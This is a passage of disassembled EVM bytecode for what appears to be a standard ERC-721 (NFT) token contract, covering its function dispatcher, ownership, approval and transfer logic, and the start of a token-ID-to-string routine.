REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2322 DUP1 PUSH3 0x3B8 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6352211E GT PUSH2 0x8C JUMPI DUP1 PUSH4 0xA22CB465 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0xA22CB465 EQ PUSH2 0x224 JUMPI DUP1 PUSH4 0xB88D4FDE EQ PUSH2 0x240 JUMPI DUP1 PUSH4 0xC87B56DD EQ PUSH2 0x25C JUMPI DUP1 PUSH4 0xE985E9C5 EQ PUSH2 0x28C JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6352211E EQ PUSH2 0x1A6 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x1D6 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x206 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x1FFC9A7 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x104 JUMPI DUP1 PUSH4 0x81812FC EQ PUSH2 0x122 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x152 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x16E JUMPI DUP1 PUSH4 0x42842E0E EQ PUSH2 0x18A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xEE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xE9 SWAP2 SWAP1 PUSH2 0x1863 JUMP JUMPDEST PUSH2 0x2BC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xFB SWAP2 SWAP1 PUSH2 0x1B80 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10C PUSH2 0x39E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x119 SWAP2 SWAP1 PUSH2 0x1B9B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x137 SWAP2 SWAP1 PUSH2 0x18BD JUMP JUMPDEST PUSH2 0x430 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x149 SWAP2 SWAP1 PUSH2 0x1B19 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x167 SWAP2 SWAP1 PUSH2 0x1823 JUMP JUMPDEST PUSH2 0x476 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x188 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x183 SWAP2 SWAP1 PUSH2 0x170D JUMP JUMPDEST PUSH2 0x58E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1A4 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x19F SWAP2 SWAP1 PUSH2 0x170D JUMP JUMPDEST PUSH2 0x5EE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1C0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1BB SWAP2 SWAP1 PUSH2 0x18BD JUMP JUMPDEST PUSH2 0x60E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1CD SWAP2 SWAP1 PUSH2 0x1B19 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1F0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1EB SWAP2 SWAP1 PUSH2 0x16A0 JUMP JUMPDEST PUSH2 0x695 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FD SWAP2 SWAP1 PUSH2 0x1CDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x20E PUSH2 0x74D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x21B SWAP2 SWAP1 PUSH2 0x1B9B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x239 SWAP2 SWAP1 PUSH2 0x17E3 JUMP JUMPDEST PUSH2 0x7DF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x25A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x255 SWAP2 SWAP1 PUSH2 0x1760 JUMP JUMPDEST PUSH2 0x7F5 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x271 SWAP2 SWAP1 PUSH2 0x18BD JUMP JUMPDEST PUSH2 0x857 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x283 SWAP2 SWAP1 PUSH2 0x1B9B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2A6 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2A1 SWAP2 SWAP1 PUSH2 0x16CD JUMP JUMPDEST PUSH2 0x8BF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2B3 SWAP2 SWAP1 PUSH2 0x1B80 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH32 0x80AC58CD00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ DUP1 PUSH2 0x387 JUMPI POP PUSH32 0x5B5E139F00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ JUMPDEST DUP1 PUSH2 0x397 JUMPI POP PUSH2 0x396 DUP3 PUSH2 0x953 JUMP JUMPDEST JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH2 0x3AD SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x3D9 SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x426 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x3FB JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x426 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x409 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43B DUP3 PUSH2 0x9BD JUMP JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x481 DUP3 PUSH2 0x60E JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x4F2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4E9 SWAP1 PUSH2 0x1C9D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x511 PUSH2 0xA08 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x540 JUMPI POP PUSH2 0x53F DUP2 PUSH2 0x53A PUSH2 0xA08 JUMP JUMPDEST PUSH2 0x8BF JUMP JUMPDEST JUMPDEST PUSH2 0x57F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x576 SWAP1 PUSH2 0x1CBD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x589 DUP4 DUP4 PUSH2 0xA10 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x59F PUSH2 0x599 PUSH2 0xA08 JUMP JUMPDEST DUP3 PUSH2 0xAC9 JUMP JUMPDEST PUSH2 0x5DE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5D5 SWAP1 PUSH2 0x1BBD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x5E9 DUP4 DUP4 DUP4 PUSH2 0xB5E JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x609 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x7F5 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x61A DUP4 PUSH2 0xE58 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x68C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x683 SWAP1 PUSH2 0x1C7D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x706 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6FD SWAP1 PUSH2 0x1C5D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x1 DUP1 SLOAD PUSH2 0x75C SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x788 SWAP1 PUSH2 0x1ED1 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x7D5 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x7AA JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x7D5 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x7B8 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x7F1 PUSH2 0x7EA PUSH2 0xA08 JUMP JUMPDEST DUP4 DUP4 PUSH2 0xE95 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x806 PUSH2 0x800 PUSH2 0xA08 JUMP JUMPDEST DUP4 PUSH2 0xAC9 JUMP JUMPDEST PUSH2 0x845 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x83C SWAP1 PUSH2 0x1BBD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x851 DUP5 DUP5 DUP5 DUP5 PUSH2 0x1002 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH2 0x862 DUP3 PUSH2 0x9BD JUMP JUMPDEST PUSH1 0x0 PUSH2 0x86C PUSH2 0x105E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 MLOAD GT PUSH2 0x88C JUMPI PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x8B7 JUMP JUMPDEST DUP1 PUSH2 0x896 DUP5 PUSH2 0x1075 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x8A7 SWAP3 SWAP2 SWAP1 PUSH2 0x1AF5 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE JUMPDEST SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x1FFC9A700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9C6 DUP2 PUSH2 0x114D JUMP JUMPDEST PUSH2 0xA05 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9FC SWAP1 PUSH2 0x1C7D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST DUP2 PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xA83 DUP4 PUSH2 0x60E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xAD5 DUP4 PUSH2 0x60E JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xB17 JUMPI POP PUSH2 0xB16 DUP2 DUP6 PUSH2 0x8BF JUMP JUMPDEST JUMPDEST DUP1 PUSH2 0xB55 JUMPI POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB3D DUP5 PUSH2 0x430 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB7E DUP3 PUSH2 0x60E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xBD4 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBCB SWAP1 PUSH2 0x1BFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC44 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC3B SWAP1 PUSH2 0x1C1D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xC51 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x118E JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC71 DUP3 PUSH2 0x60E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xCC7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xCBE SWAP1 PUSH2 0x1BFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 SSTORE PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0xE53 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12B4 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xF04 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEFB SWAP1 PUSH2 0x1C3D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x5 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x17307EAB39AB6107E8899845AD3D59BD9653F200F220920489CA2B5937696C31 DUP4 PUSH1 0x40 MLOAD PUSH2 0xFF5 SWAP2 SWAP1 PUSH2 0x1B80 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x100D DUP5 DUP5 DUP5 PUSH2 0xB5E JUMP JUMPDEST PUSH2 0x1019 DUP5 DUP5 DUP5 DUP5 PUSH2 0x12BA JUMP JUMPDEST PUSH2 0x1058 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x104F SWAP1 PUSH2 0x1BDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH1 0x1 PUSH2 0x1084 DUP5 PUSH2 0x1451 JUMP JUMPDEST ADD SWAP1 POP PUSH1 0x0 DUP2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x10A3 JUMPI PUSH2 0x10A2 PUSH2 0x1FC1 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x10D5 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x20 ADD DUP3 ADD SWAP1 POP JUMPDEST PUSH1 0x1 ISZERO PUSH2 0x1142 JUMPI DUP1 DUP1 PUSH1 0x1 SWAP1 SUB SWAP2 POP POP PUSH32 0x3031323334353637383961626364656600000000000000000000000000000000 PUSH1 0xA DUP7 MOD BYTE DUP2 MSTORE8 PUSH1 0xA DUP6 DUP2 PUSH2 0x112C JUMPI PUSH2 0x112B PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV 